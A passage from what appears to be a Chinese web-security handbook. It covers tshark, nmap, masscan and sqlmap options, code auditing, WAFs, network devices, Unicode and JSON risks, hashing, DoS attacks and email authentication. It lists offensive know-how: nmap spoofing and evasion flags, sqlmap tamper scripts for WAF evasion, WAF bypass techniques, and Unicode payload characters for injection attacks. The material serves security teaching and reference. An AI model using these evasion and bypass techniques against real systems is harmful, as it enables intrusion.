- `-R file` 读取文件，但是只读取完整的文件

#### 11.3.4. tshark

WireShark的命令行工具，可以通过命令提取自己想要的数据。

##### 输入接口
- `-i <interface>` 指定捕获接口
- `-f <capture filter>` 设置抓包过滤表达式
- `-s <snaplen>` 设置快照长度
- `-p` 以非混合模式工作
- `-B <buffer size>` 设置缓冲区的大小
- `-y <link type>` 设置抓包的数据链路层协议
- `-D` 打印接口的列表并退出
- `-L` 列出本机支持的数据链路层协议
- `-r <infile>` 设置读取本地文件

##### 捕获停止选项
- `-c <packet count>` 捕获n个包之后结束
- `-a <autostop cond>`
  - `duration:NUM` 在num秒之后停止捕获
  - `filesize:NUM` 在numKB之后停止捕获
  - `files:NUM` 在捕获num个文件之后停止捕获

##### 处理选项
- `-Y <display filter>` 使用读取过滤器的语法
- `-n` 禁止所有地址名字解析
- `-N` 启用某一层的地址名字解析
- `-d` 将指定的数据按有关协议解包输出

##### 输出选项
- `-w <outfile>` 设置raw数据的输出文件
- `-F <output file type>` 设置输出的文件格式
- `-V` 增加细节输出
- `-O <protocols>` 只显示此选项指定的协议的详细信息
- `-P` 即使将解码结果写入文件中，也打印包的概要信息
- `-S <separator>` 行分割符
- `-x` 设置在解码输出结果中以HEX dump的方式显示具体数据
- `-T pdml|ps|text|fields|psml` 设置解码结果输出的格式
- `-e` 用来指定输出哪些字段
- `-t a|ad|d|dd|e|r|u|ud` 设置解码结果的时间格式
- `-u s|hms` 格式化输出秒
- `-l` 在输出每个包之后flush标准输出
- `-q` 结合 `-z` 选项进行使用
- `-X <key>:<value>` 扩展项
- `-z` 统计选项

##### 其他选项
- `-h` 显示命令行帮助
- `-v` 显示tshark的版本信息

---

## [嗅探工具](https://websec.readthedocs.io/zh/latest/manual/sniffing.html)

### 11.4. 嗅探工具

#### 11.4.1. Nmap

`nmap [<扫描类型>...] [<选项>] {<扫描目标说明>}`

##### 指定目标
- CIDR风格 `192.168.1.0/24`
- 逗号分割 `www.baidu.com,www.zhihu.com`
- 分割线 `10.22-25.43.32`
- 来自文件 `-iL <inputfile>`
- 排除不需要的host `--exclude <host1 [, host2] [, host3] ... >` `--excludefile <excludefile>`

##### 主机发现
- `-sL` List Scan - simply list targets to scan
- `-sn/-sP` Ping Scan - disable port scan
- `-Pn` Treat all hosts as online -- skip host discovery
- `-sS/sT/sA/sW/sM` TCP SYN/Connect()/ACK/Window/Maimon scans
- `-sU` UDP Scan
- `-sN/sF/sX` TCP Null, FIN, and Xmas scans

**扫描方式表**

| 名称 | 包标记 | 端口OPEN | 端口CLOSE | 特点 |
| ---- | ------ | -------- | --------- | ---- |
| TCP SYN scan | SYN | 回复ACK+SYN | 回复RST | 应用程序无日志，但是容易被发现 |
| 全连接扫描 | SYN | 回复ACK+SYN | 回复RST | 容易被发现 |
| ACK扫描 | ACK | 回复RST | 包被丢弃 | . |
| FIN扫描 | FIN | 包被丢弃 | 回复RST | 需要等待超时，效率低 |
| TCP Xmas扫描 | FIN+URG+PSH | 包被丢弃 | 回复RST | 需要等待超时，效率低；不适用所有操作系统 |
| TCP NULL扫描 | NULL | 包被丢弃 | 回复RST | 需要等待超时，效率低；不适用所有操作系统 |

##### 端口扫描
- `--scanflags` 定制的TCP扫描
- `-P0` 无ping
- `PS [port list]` (TCP SYN ping)
- `PA [port list]` (TCP ACK ping)
- `PU [port list]` (UDP ping)
- `PR (Arp ping)`
- `p <port message>`
- `F` 快速扫描
- `r` 不使用随机顺序扫描

##### 服务和版本探测
- `-sV` 版本探测
- `--allports` 不为版本探测排除任何端口
- `--version-intensity <intensity>` 设置版本扫描强度
- `--version-light` 打开轻量级模式
- `--version-all` 尝试每个探测
- `--version-trace` 跟踪版本扫描活动
- `-sR` RPC扫描

##### 操作系统扫描
- `-O` 启用操作系统检测
- `--osscan-limit` 针对指定的目标进行操作系统检测
- `--osscan-guess`
- `--fuzzy` 推测操作系统检测结果

##### 时间和性能
- 调整并行扫描组的大小 `--min-hostgroup` / `--max-hostgroup`
- 调整探测报文的并行度 `--min-parallelism` / `--max-parallelism`
- 调整探测报文超时 `--min_rtt_timeout` / `--max-rtt-timeout` / `--initial-rtt-timeout`
- 放弃低速目标主机 `--host-timeout`
- 调整探测报文的时间间隔 `--scan-delay` / `--max_scan-delay`
- 设置时间模板 `-T <Paranoid|Sneaky|Polite|Normal|Aggressive|Insane>` / `-T<0-5>`

##### 逃避检测相关
- `-f` 报文分段
- `--mtu` 使用指定的MTU
- `-D<decoy1[， decoy2][， ME]， ...>` 使用诱饵隐蔽扫描
- `-S<IP_Address>` 源地址哄骗
- `-e <interface>` 使用指定的接口
- `--source-port<portnumber>` 源端口哄骗
- `--data-length<number>` 发送报文时附加随机数据
- `--ttl <value>` 设置ttl
- `--randomize-hosts` 对目标主机的顺序随机排列
- `--spoof-mac<macaddress， prefix， orvendorname>` MAC地址哄骗

##### 输出
- `-oN<filespec>` 标准输出
- `-oX<filespec>` XML输出
- `-oS<filespec>` ScRipTKIdd|3oUTpuT
- `-oG<filespec>` Grep输出
- `-oA<basename>` 输出至所有格式
- `--open` 仅输出可能开放的端口信息

##### 细节和调试
- `-v` 信息详细程度
- `-d [level]` debug level
- `--packet-trace` 跟踪发送和接收的报文
- `--iflist` 列举接口和路由

#### 11.4.2. Masscan

##### 编译
```bash
sudo apt-get install git gcc make libpcap-dev
git clone https://github.com/robertdavidgraham/masscan
cd masscan
make -j
```

##### 命令行选项
- `--ports` 指定端口范围
- `--rate` 指定速率
- `--source-ip` 指定源IP

---

## [SQLMap使用](https://websec.readthedocs.io/zh/latest/manual/sqlmap.html)

### 11.5. SQLMap使用

#### 安装
```
git clone https://github.com/sqlmapproject/sqlmap.git sqlmap
```

#### 11.5.1. 常用参数
- `-u` `--url` 指定目标url
- `-m` 从文本中获取多个目标扫描
- `-r` 从文件中加载HTTP请求
- `--data` 以POST方式提交数据
- `-random-agent` 随机ua
- `--user-agent` 指定ua
- `--delay` 设置请求间的延迟
- `--timeout` 指定超时时间
- `--dbms` 指定db，sqlmap支持的db有MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、SQLite等
- `--os` 指定数据库服务器操作系统
- `--tamper` 指定tamper
- `--level` 指定探测等级
- `--risk` 指定风险等级
- `--technique` 注入技术
  - B: Boolean-based blind SQL injection
  - E: Error-based SQL injection
  - U: UNION query SQL injection
  - S: Stacked queries SQL injection
  - T: Time-based blind SQL injection

#### 11.5.2. Tamper 速查

| 脚本名称 | 作用 |
|---|---|
| apostrophemask.py | 用utf8代替引号 |
| equaltolike.py | like 代替等号 |
| space2dash.py | 绕过过滤'=' 替换空格字符 |
| greatest.py | 绕过过滤'>' 用GREATEST替换大于号 |
| space2hash.py | 空格替换为 #号 随机字符串 以及换行符 |
| apostrophenullencode.py | 绕过过滤双引号 |
| halfversionedmorekeywords.py | mysql时绕过防火墙，每个关键字之前添加mysql版本评论 |
| space2morehash.py | 空格替换为 #号 以及更多随机字符串 换行符 |
| appendnullbyte.py | 在有效负荷结束位置加载零字节字符编码 |
| ifnull2ifisnull.py | 绕过对 IFNULL 过滤 |
| space2mssqlblank.py | 空格替换为其它空符号 |
| base64encode.py | 用base64编码替换 |
| space2mssqlhash.py | 替换空格 |
| modsecurityversioned.py | 过滤空格，包含完整的查询版本注释 |
| space2mysqlblank.py | 空格替换其它空白符号(mysql) |
| between.py | 用between替换大于号(>) |
| space2mysqldash.py | 替换空格字符后跟一个破折号注释一个新行 |
| multiplespaces.py | 围绕SQL关键字添加多个空格 |
| space2plus.py | 用+替换空格 |
| bluecoat.py | 代替空格字符后与一个有效的随机空白字符 然后替换=为like |
| nonrecursivereplacement.py | 取代predefined SQL关键字 |
| space2randomblank.py | 代替空格字符从一个随机的空白字符 |
| sp_password.py | 追加sp_password'从DBMS日志的自动模糊处理的有效载荷的末尾 |
| chardoubleencode.py | 双url编码 |
| unionalltounion.py | 替换UNION ALL SELECT UNION SELECT |
| charencode.py | url编码 |
| randomcase.py | 随机大小写 |
| unmagicquotes.py | 宽字符绕过 GPC addslashes |
| randomcomments.py | 用 /\*\*/ 分割sql关键字 |
| charunicodeencode.py | 字符串unicode编码 |
| securesphere.py | 追加特制的字符串 |
| versionedmorekeywords.py | 注释绕过 |
| space2comment.py | Replaces space character ' ' with comments /\*\*/ |

---

## [代码审计](https://websec.readthedocs.io/zh/latest/misc/audit.html)

### 12.1. 代码审计

#### 12.1.1. 简介

代码审计是找到应用缺陷的过程。其通常有白盒审计、黑盒审计、灰盒审计等方式。白盒审计指通过对源代码的分析找到应用缺陷，黑盒审计通常不涉及到源代码，多使用模糊测试的方式，而灰盒审计则是黑白结合的方式。

#### 12.1.2. 常用概念

##### 输入

输入通常也称Source，Web应用的输入可以是请求的参数（GET、POST等）、上传的文件、Cookie、数据库数据等用户可控或者间接可控的地方。

例如PHP中的 `$_GET` / `$_POST` / `$_REQUEST` / `$_COOKIE` / `$_FILES` / `$_SERVER` 等，都可以作为应用的输入。

##### 处理函数

处理函数是对数据进行过滤或者编解码的函数，通常被称为Clean/Filter/Sanitizer。这些函数会对输入进行安全操作或过滤，为漏洞利用带来不确定性。

##### 危险函数

危险函数又常叫做Sink Call、漏洞点，是可能触发危险行为如文件操作、命令执行、数据库操作等行为的函数。

在PHP中，可能是 `include` / `system` / `echo` 等。

#### 12.1.3. 自动化审计

一般认为一个漏洞的触发过程是从输入经过过滤到危险函数的过程(Source To Sink)，而审计就是寻找这个链条的过程。常见的自动化审计方案有危险函数匹配、控制流分析等。

##### 危险函数匹配

白盒审计最常见的方式是通过搜寻危险函数与危险参数定位漏洞，比较有代表性的工具是Seay开发的审计工具。这种方法误报率相当高。

##### 控制流分析

在后来的系统中，考虑到一定程度引入AST作为分析的依据。Dahse J等人设计了RIPS，该工具进行数据流与控制流分析。

##### 基于图的分析

基于图的分析是对控制流分析的一个改进，其利用CFG的特性和图计算的算法，比较有代表性的是微软的Semmle QL和NDSS 2017年发表的文章Efficient and Flexible Discovery of PHP Application Vulnerabilities。

##### 代码相似性比对

一些开发者会复制其他框架的代码，或者使用各种框架。如果事先有建立对应的漏洞图谱，则可使用相似性方法来找到漏洞。

##### 灰盒分析

基于控制流的分析开销较大，于是有人提出了基于运行时的分析方式，对代码进行Hook。fate0开发的prvd就是基于这种设计思路。

#### 12.1.4. 手工审计流程

- 获取代码，确定版本，尝试初步分析
  - 找历史漏洞信息
  - 找应用该系统的实例
  - 确定依赖库是否存在漏洞
- 基于审计工具进行初步分析
- 了解程序运行流程
  - 文件加载方式（类库依赖、是否加载waf）
  - 数据库连接方式（mysql/mysqli/pdo、是否开启预编译）
  - 视图渲染（XSS、模版注入）
  - SESSION处理机制（文件、数据库、内存）
  - Cache处理机制（文件cache可能写shell、数据库cache可能注入、memcache）
- 账户体系
  - Auth方式
  - Pre-Auth的情况下可以访问的页面
  - 普通用户的帐号能否获取权限
  - 管理员账户默认密码
  - 账号体系（加密方式、爆破密码、重置漏洞、修改密码漏洞）
- 根据漏洞类型查找Sink
  - SQLi（全局过滤能否bypass、是否有直接执行SQL的地方、SQL使用驱动）
  - XSS（全局bypass、视图渲染）
  - FILE（查找上传功能点、上传下载覆盖删除、包含LFI/RFI）
  - RCE、XXE、CSRF、SSRF、反序列化、变量覆盖、LDAP、XPath、Cookie伪造
- 过滤
  - 找WAF过滤方式，判断是否可以绕过

#### 12.1.5. 参考链接
- [rips](https://github.com/ripsscanner/rips)
- [prvd](https://github.com/fate0/prvd)
- [PHP运行时漏洞检测](http://blog.fatezero.org/2018/11/11/prvd/)
- Backes M , Rieck K , Skoruppa M , et al. Efficient and Flexible Discovery of PHP Application Vulnerabilities[C]// IEEE European Symposium on Security & Privacy. IEEE, 2017.
- Dahse J. RIPS-A static source code analyser for vulnerabilities in PHP scripts[J]. Retrieved: February, 2010, 28: 2012.

---

## [WAF](https://websec.readthedocs.io/zh/latest/misc/waf.html)

### 12.2. WAF

#### 12.2.1. 简介

##### 概念

WAF（Web Application Firewall，Web应用防火墙）是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供加固的产品。

在市场上，有各种价格各种功能和选项的WAF。在一定程度上，WAF能为Web应用提供安全性，但是不能保证完全的安全。

##### 常见功能

- 检测异常协议，拒绝不符合HTTP标准的请求
- 对状态管理进行会话保护
- Cookies保护
- 信息泄露保护
- DDoS防护
- 禁止某些IP访问
- 可疑IP检查
- 安全HTTP头管理（X-XSS-Protection、X-Frame-Options）
- 机制检测（CSRF token、HSTS）

##### 布置位置

按布置位置，WAF可以分为云WAF、主机防护软件和硬件防护。

#### 12.2.2. 防护方式

WAF常用的方法有关键字检测、正则表达式检测、语法分析、行为分析、声誉分析、机器学习等。

基于正则的保护是最常见的保护方式。基于语法的分析相对正则来说更快而且更准确。基于行为的分析着眼的范围更广。基于声誉的分析可以比较好的过滤掉一些可疑的来源。基于机器学习的WAF涉及到的范围非常广，效果也因具体实现和场景而较为多样化。

#### 12.2.3. 扫描器防御
- 基于User-Agent识别
- 基于攻击载荷识别
- 验证码

#### 12.2.4. WAF指纹
- 额外的Cookie
- 额外的Header
- 被拒绝请求时的返回内容
- 被拒绝请求时的返回响应码
- IP

#### 12.2.5. 绕过方式

##### 基于架构的绕过
- 站点在WAF后，但是站点可直连
- 站点在云服务器中，对同网段服务器无WAF

##### 基于资源的绕过
- 使用消耗大的载荷，耗尽WAF的计算资源
- 提供大量的无效参数

##### 基于解析的绕过
- 字符集解析不同
- 协议覆盖不全（POST的JSON传参 / `form-data` / `multipart/form-data`）
- 协议解析不正确
- 站点和WAF对https有部分不一致
- WAF解析与Web服务解析不一致
  - 部分ASP+IIS会转换 `%u0065` 格式的字符
  - Apache会解析畸形Method
  - 同一个参数多次出现，取的位置不一样
  - HTTP Parameter Pollution (HPP)
  - HTTP Parameter Fragmentation (HPF)

##### 基于规则的绕过
- 等价替换
  - 大小写变换 `select` => `sEleCt`
  - 字符编码（URL编码、十六进制编码、Unicode解析、Base64、HTML、JSFuck等）
  - 等价函数、等价变量、关键字拆分、字符串操作
- 字符干扰
  - 空字符（NULL x00、空格、回车 x0d、换行 x0a、垂直制表 x0b、水平制表 x09、换页 x0c）
  - 注释
- 特殊符号（注释符、引号）
- 利用服务本身特点（替换可疑关键字为空 `selselectect` => `select`）
- 少见特性未在规则列表中

#### 12.2.6. 参考链接
- [WAF攻防研究之四个层次Bypass WAF](https://www.weibo.com/ttarticle/p/show?id=2309404007261092631700)
- [我的WafBypass之道 SQL注入篇](https://xz.aliyun.com/t/368)
- [WAF through the eyes of hackers](https://habr.com/en/company/dsec/blog/454592/)

---

## [常见网络设备](https://websec.readthedocs.io/zh/latest/misc/netdev.html)

### 12.3. 常见网络设备

#### 12.3.1. 防火墙

##### 简介

防火墙指的是一个有软件和硬件设备组合而成、在内部网和外部网之间、专用网与公共网之间的界面上构造的保护屏障。

防火墙可以分为网络层防火墙和应用层防火墙。网络层防火墙基于源地址和目的地址、应用、协议以及每个IP包的端口来作出通过与否的判断。应用层防火墙针对特别的网络应用服务协议即数据过滤协议。

##### 主要功能

- 过滤进、出网络的数据
- 防止不安全的协议和服务
- 管理进、出网络的访问行为
- 记录通过防火墙的信息内容
- 对网络攻击进行检测与警告
- 防止外部对内部网络信息的获取
- 提供与外部连接的集中管理

##### 下一代防火墙

主要是一款全面应对应用层威胁的高性能防火墙。可以做到智能化主动防御、应用层数据防泄漏、应用层洞察与控制、威胁防护等特性。

#### 12.3.2. IDS

##### 简介

入侵检测即通过从网络系统中的若干关键节点收集并分析信息，监控网络中是否有违反安全策略的行为或者是否存在入侵行为。

IDS可以分为基于主机的入侵检测系统(HIDS)和基于网络的入侵检测系统(NIDS)。

基于主机的入侵检测系统是早期的入侵检测系统结构，通常是软件型的，直接安装在需要保护的主机上。

基于网络的入侵检测方式是目前一种比较主流的监测方式，这类检测系统需要有一台专门的检测设备。

#### 12.3.3. IPS（入侵防御系统）

##### 简介

入侵防御系统是一部能够监视网络或网络设备的网络资料传输行为的计算机网络安全设备，能够即时的中断、调整或隔离一些不正常或是具有伤害性的网络资料传输行为。

##### 主要类型

可以分为基于特征的IPS、基于异常的IPS、基于策略的IPS、基于协议分析的IPS。

- 基于特征的IPS是最常用的方法，把特征添加到设备中识别常见攻击
- 基于异常的IPS可以用统计异常检测和非统计异常检测
- 基于策略的IPS关心是否执行组织的安保策略
- 基于协议分析的IPS可以做更深入的数据包检查

#### 12.3.4. 安全隔离网闸

##### 简介

安全隔离网闸是使用带有多种控制功能的固态开关读写介质连接两个独立网络系统的信息安全设备。由于物理隔离网闸所连接的两个独立网络系统之间，不存在通信的物理连接、逻辑连接、信息传输命令、信息传输协议，不存在依据协议的信息包转发，只有数据文件的无协议"摆渡"。

##### 主要功能

- 阻断网络的直接物理连接
- 阻断网络的逻辑连接
- 安全审查
- 原始数据无危害性
- 管理和控制功能
- 根据需要建立数据特征库
- 根据需要提供定制安全策略和传输策略的功能

#### 12.3.5. VPN设备

##### 简介

虚拟专用网络指的是在公用网络上建立专用网络的技术。之所以称为虚拟网主要是因为整个VPN网络的任意两个节点之间的连接并没有传统专网所需的端到端的物理链路。

##### 常用技术

- MPLS VPN：是一种基于MPLS技术的IP VPN
- SSL VPN：是以HTTPS为基础的VPN技术，工作在传输层和应用层之间
- IPSecVPN：基于IPSec协议的VPN技术

#### 12.3.6. 安全审计系统

网络安全审计系统针对互联网行为提供有效的行为审计、内容审计、行为报警、行为控制及相关审计功能。

#### 12.3.7. 参考链接

- [网络安全设备](https://wenku.baidu.com/view/2b5540cca32d7375a517806a.html)

---

## [指纹](https://websec.readthedocs.io/zh/latest/misc/finger.html)

### 12.4. 指纹

#### 12.4.1. 浏览器指纹

- **软件细节** - navigator、安装插件、浏览器支持的特性、CSS支持、JavaScript特性、已安装字体等
- **WebGL信息** - GL版本、纹理大小、渲染缓冲区、WebGL扩展等
- **硬件信息** - 电池API、传感器API、WebRTC获取流媒体设备、系统性能等
- **持久化存储** - cookie、localStorage、indexedDB、sessionStorage
- **系统设置** - 时钟偏移
- **主动探测** - 构造特定DNS请求并发送

#### 12.4.2. 参考链接

- [设备指纹指南](https://mp.weixin.qq.com/s/ClG5cgv9Cu7zoyPcWOoU4A)

---

## [Unicode](https://websec.readthedocs.io/zh/latest/misc/unicode.html)

### 12.5. Unicode

#### 12.5.1. 基本概念

##### BMP

BMP (Basic Multilingual Plane)，译作基本多文种平面，是Unicode中的一个编码区块。

##### 码平面

Unicode编码点分为17个平面（plane），每个平面包含2^16（即65536）个码位。

##### Code Point

Code Point也被称作Code Position，译作码位或编码位置，是指组成代码空间的数值。

##### Code Unit

指某种 Unicode 编码方式里编码一个 Code Point 需要的最少字节数，比如 UTF-8 需要最少一个字节，UTF-16 最少两个字节。

##### Surrogate Pair

Surrogate Pair 是用于 UTF-16 的以向后兼容 UCS-2 的，做法是取 UCS-2 范围里的 0xD800~0xDBFF (称为 high surrogates) 和 0xDC00~0xDFFF (称为 low surrogates) 的码位。

##### Combining Character

例如 `He̊llö` 含有重音符号之类的字符，进行组合会使用大量的码位。

##### BOM

字节顺序标记（byte-order mark，BOM）是一个有特殊含义的统一码字符，码点为 `U+FEFF`。

#### 12.5.2. 编码方式

##### UCS-2

UCS-2 (2-byte Universal Character Set)是一种定长的编码方式，仅仅简单的使用一个16位码元来表示码位。

##### UTF-8

UTF-8（8-bit Unicode Transformation Format）是一种针对Unicode的可变长度字符编码。

| 码点的位数 | 码点起值 | 码点终值 | 字节序列 | Byte 1 | Byte 2 | Byte 3 | Byte 4 |
| ----- | --------- | ---------- | ---- | -------- | -------- | -------- | -------- |
| 7 | U+0000 | U+007F | 1 | 0xxxxxxx | | | |
| 11 | U+0080 | U+07FF | 2 | 110xxxxx | 10xxxxxx | | |
| 16 | U+0800 | U+FFFF | 3 | 1110xxxx | 10xxxxxx | 10xxxxxx | |
| 21 | U+10000 | U+1FFFFF | 4 | 11110xxx | 10xxxxxx | 10xxxxxx | 10xxxxxx |

##### UTF-16

UTF-16 (16-bit Unicode Transformation Format)是UCS-2的拓展，用一个或者两个16位的码元来表示码位。

#### 12.5.3. 等价性问题

##### 简介

Unicode（统一码）包含了许多特殊字符，为了使得许多现存的标准能够兼容，提出了Unicode等价性（Unicode equivalence）。

Unicode正规化是文字正规化的一种形式，是指将彼此等价的序列转成同一列序。对于每种等价概念，Unicode又定义两种形式：NFC、NFD、NFKC、NFKD。

##### 标准等价

统一码中标准等价的基础概念为字符的组成和分解的交互使用。

##### 兼容等价

兼容等价的范围较标准等价来得广。如果序列是标准等价的话就会是兼容等价，反之则未必对。

##### 正规形式

- **NFD** Normalization Form Canonical Decomposition 以标准等价方式来分解
- **NFC** Normalization Form Canonical Composition 以标准等价方式来分解，然后以标准等价重组之
- **NFKD** Normalization Form Compatibility Decomposition 以兼容等价方式来分解
- **NFKC** Normalization Form Compatibility Composition 以兼容等价方式来分解，然后以标准等价重组之

#### 12.5.4. Tricks

- 部分语言的长度并不是字符的长度，一个UTF-16可能是两位
- 部分语言在翻转UTF-16等多字节编码时，会处理错误

#### 12.5.5. 安全问题

##### Visual Spoofing

例如bаidu.com(此处的a为u0430)和baidu.com(此处的a为x61)视觉上相同，但是实际上指向两个不同的域名。

##### Best Fit

如果两个字符前后编码不同，之前的编码在之后的编码没有对应，程序会尝试找最佳字符进行自动转换，可能引起WAF Bypass。

##### Syntax Spoofing

以下四个Url在语法上看来是没问题的域名，但是用来做分割的字符并不是真正的分割字符，而是U+2044。

- http://macchiato.com/x.bad.com
- http://macchiato.com?x.bad.com
- http://macchiato.com.x.bad.com
- http://macchiato.com#x.bad.com

##### Punycode Spoofs

- http://䕮䕵䕶䕱.com → http://xn--google.com
- http://䁾.com → http://xn--cnn.com
- http://岍岊岊岅岉岎.com → http://xn--citibank.com

##### Buffer Overflows

在编码转换的时候，有的字符会变成多个字符，如Fluß → FLUSS → fluss这样可能导致BOF。

#### 12.5.6. 常见载荷

##### URL
- `‥` (U+2025)、`︰` (U+FE30)、`。` (U+3002)、`⓪` (U+24EA)、`／` (U+FF0F)、`ｐ` (U+FF50)、`ʰ` (U+02B0)、`ª` (U+00AA)

##### SQL注入
- `＂` (U+FF07)、`＂` (U+FF02)、`﹣` (U+FE63)

##### XSS
- `＜` (U+FF1C)、`＂` (U+FF02)

##### 命令注入
- `＆` (U+FF06)、`｜` (U+FF5C)

##### 模板注入
- `﹛` (U+FE5B)、`［` (U+FF3B)

#### 12.5.7. 参考链接

- [Unicode equivalence](https://en.wikipedia.org/wiki/Unicode%5Fequivalence)
- [Unicode Normalization Forms](http://unicode.org/reports/tr15/)
- [Unicode Security Considerations](http://unicode.org/reports/tr36/)
- [RFC 3629](https://tools.ietf.org/html/rfc3629) UTF-8
- [IDN homograph attack](https://en.wikipedia.org/wiki/IDN%5Fhomograph%5Fattack)
- [Black Hat Unicode Security](https://www.blackhat.com/presentations/bh-usa-09/WEBER/BHUSA09-Weber-UnicodeSecurityPreview-PAPER.pdf)
- [其实你并不懂 Unicode](https://zhuanlan.zhihu.com/p/53714077)

---

## [JSON](https://websec.readthedocs.io/zh/latest/misc/json.html)

### 12.6. JSON

JSON (JavaScript Object Notation) 是许多数据格式通信的基石。

#### 12.6.1. 安全风险

- 重复的key `{"test": 1, "test": 2}`
- 特殊的key值 `\x00` `\x0d` `\ud800` `"` 等
- 序列化
- 特定的数值
  - 超过上限的整数
  - 科学计数法
  - null值的不同表示

#### 12.6.2. 参考链接

- [RFC 8259 The JavaScript Object Notation (JSON) Data Interchange Format](https://tools.ietf.org/html/rfc8259)
- [ECMA-404 The JSON data interchange syntax](https://www.ecma-international.org/publications-and-standards/standards/ecma-404/)
- [json5](https://json5.org/)

---

## [哈希](https://websec.readthedocs.io/zh/latest/misc/hash.html)

### 12.7. 哈希

#### 12.7.1. 简介

Hash 一般译作散列，又称杂凑，或音译为哈希，是一种把数据映射为特定长度输出值的方法。

常见的哈希函数有：CRC32、MD4 / MD5、SHA0 / SHA1 / SHA256 / SHA512、SipHash、MurMurHash、CityHash、xxHash

#### 12.7.2. 特点

- 一致性，同一个数据通过同种哈希算法计算出的值是一样的
- 雪崩效应，原始数据小的修改也会导致哈希结果的巨大变化
- 单向，只能从原始数据计算哈希，而不可以反向计算
- 避免冲突，很难找到两个不同的数据可以计算出相同的哈希

#### 12.7.3. 完美哈希

完美哈希 (Perfect Hashing) 是指在哈希计算过程中，不会出现冲突，也就是说哈希函数是一个完全单射函数。

目前已有的完美哈希函数有 FCH、CHD、PTHash 等。

#### 12.7.4. 安全风险

##### Hash-Flooding Attack

Hash-Flooding Attack 是面向Web后端处理语言的一种攻击方式，通过构造特定的表单值频繁触发哈希碰撞，使得原本的Hash Map 获得指数级的性能下降。

早在2003年usenix的论文 Denial of Service via Algorithmic Complexity Attacks 提出了这种攻击方式。研究员设计了SipHash、MurmurHash、CityHash等新的哈希函数，核心思路是为哈希算法加入了一个密钥。Python、Rust、Ruby等语言也将SipHash做为默认的哈希算法。

#### 12.7.5. 参考链接

- [Denial of Service via Algorithmic Complexity Attacks](https://www.usenix.org/conference/12th-usenix-security-symposium/denial-service-algorithmic-complexity-attacks)
- [SipHash](https://github.com/veorq/SipHash) High-speed secure pseudorandom function for short messages
- FCH [A Faster Algorithm for Constructing Minimal Perfect Hash Functions](http://cmph.sourceforge.net/papers/fch92.pdf)
- CHD [Hash, displace, and compress](http://cmph.sourceforge.net/papers/esa09.pdf)
- [PTHash: Revisiting FCH Minimal Perfect Hashing](https://dl.acm.org/doi/pdf/10.1145/3404835.3462849)

---

## [拒绝服务攻击](https://websec.readthedocs.io/zh/latest/misc/dos.html)

### 12.8. 拒绝服务攻击

#### 12.8.1. 简介

DoS（Denial of Service）指拒绝服务，是一种常用来使服务器或网络瘫痪的网络攻击手段。

在平时更多提到的是分布式拒绝服务（DDoS，Distributed Denial of Service） 攻击，该攻击是指利用足够数量的傀儡计算机产生数量巨大的攻击数据包，对网络上的一台或多台目标实施DDoS攻击。

#### 12.8.2. UDP反射

基于UDP文的反射DDoS攻击是拒绝服务攻击的一种形式。攻击者利用互联网中某些开放的服务器，伪造被攻击者的地址并向该服务器发送基于UDP服务的特殊请求报文。

常用于DoS攻击的服务有: NTP、DNS、SSDP、Memcached

#### 12.8.3. TCP Flood

TCP Flood是一种利用TCP协议缺陷的攻击，通过伪造IP向攻击服务器发送大量伪造的TCP SYN请求，被攻击服务器回应握手包后，因为伪造的IP不会回应之后的握手包，服务器会保持在SYN_RECV状态。

#### 12.8.4. Shrew DDoS

Shrew DDoS利用了TCP的重传机制，调整攻击周期来反复触发TCP协议的RTO，达到攻击的效果。

#### 12.8.5. Ping Of Death

报文支持分片重组机制，可以发送大于65536字节的ICMP包并在目标主机上重组，最终会导致被攻击目标缓冲区溢出。

现代操作系统已经对这种攻击方式进行检查，使得其不受影响。

#### 12.8.6. Challenge Collapsar (CC)

CC攻击是一种针对资源的DoS攻击，攻击者通常会常用请求较为消耗服务器资源的方式来达到目的。

#### 12.8.7. 慢速攻击

HTTP慢速攻击由Wong Onn Chee 和 Tom Brennan在2012年的OWASP大会上正式披露。

慢速攻击分为 Slow headers / Slow body / Slow read 三种攻击方式：
- Slow headers 一直不停的慢速发送HTTP头部，消耗服务器的连接和内存资源
- Slow body 发送一个 Content-Length 很大的 HTTP POST请求，每次只发送很少量的数据
- Slow read 以很低的速度读取Response

#### 12.8.8. 基于服务特性

- 压缩包解压（巨大的0字节的压缩包）
- 读文件（读 `/dev/urandom` 等无限制的文件、高频访问特定的大文件下载链接）
- 受限制的反序列化（反序列化巨大的数组）
- 正则解析（消耗巨大的回溯表达式）

#### 12.8.9. 常用的防护方式

- 基于特定攻击的指纹检测攻击，对相应流量进行封禁/限速操作
- 对正常流量进行建模，对识别出的异常流量进行封禁/限速操作
- 基于IP/端口进行综合限速策略
- 基于地理位置进行封禁/限速操作

#### 12.8.10. 参考链接

- [linux academy dos](https://linuxacademy.com/howtoguides/posts/show/topic/13191-denial-of-service-dos)
- [slowhttptest](https://github.com/shekyan/slowhttptest) Application Layer DoS attack simulator
- [Slowloris wiki](https://en.wikipedia.org/wiki/Slowloris%5F%28computer%5Fsecurity%29)

---

## [邮件安全](https://websec.readthedocs.io/zh/latest/misc/email.html)

### 12.9. 邮件安全

#### 12.9.1. 常用概念

邮件安全常用的概念是**SPF**、**DKIM**和**DMARC**。

**SPF (Sender Policy Framework)**
- 一条特殊的**DNS记录**
- 用于设定**合法的发送邮件的IP**
- 邮件接收方通过检查发送方IP是否在SPF记录中，来验证邮件是否来自授权的邮件服务器

**DKIM (DomainKeys Identified Mail)**
- 将**数字签名**添加到电子邮件消息的标题中
- 使邮件服务器拥有确保邮件内容没有更改的能力
- 通过查询 `<selector>._domainkey.example.com` 的TXT记录查询

**DMARC (Domain-based Message Authentication)**
- 基于域名消息认证
- 用于防止邮件伪造和钓鱼攻击

| 协议 | 全称 | 用途 | 存储位置 |
|------|------|------|----------|
| SPF | Sender Policy Framework | 设定合法发件IP | DNS记录 |
| DKIM | DomainKeys Identified Mail | 数字签名验证内容完整性 | DNS记录 |
| DMARC | Domain-based Message Authentication | 邮件认证和防护 | DNS记录 |

---

## [APT](https://websec.readthedocs.io/zh/latest/misc/apt.html)

### 12.10. APT

#### 12.10.1. 简介

APT (Advanced Persistent Threat)，翻译为高级持续威胁。2006年，APT攻击的概念被正式提出，用来描述从20世纪90年代末到21世纪初在美国军事和政府网络中发现的隐蔽且持续的网络攻击。

发起APT攻击的通常是一个组织，其团体是一个既有能力也有意向持续而有效地进行攻击的实体。APT的攻击手段通常包括供应链攻击、社会工程学攻击、零日攻击和僵尸网络等多种方式。

#### 12.10.2. 高级性（Advanced）

APT攻击会结合当前所有可用的攻击手段和技术，使得攻击具有极高的隐蔽性和渗透性。

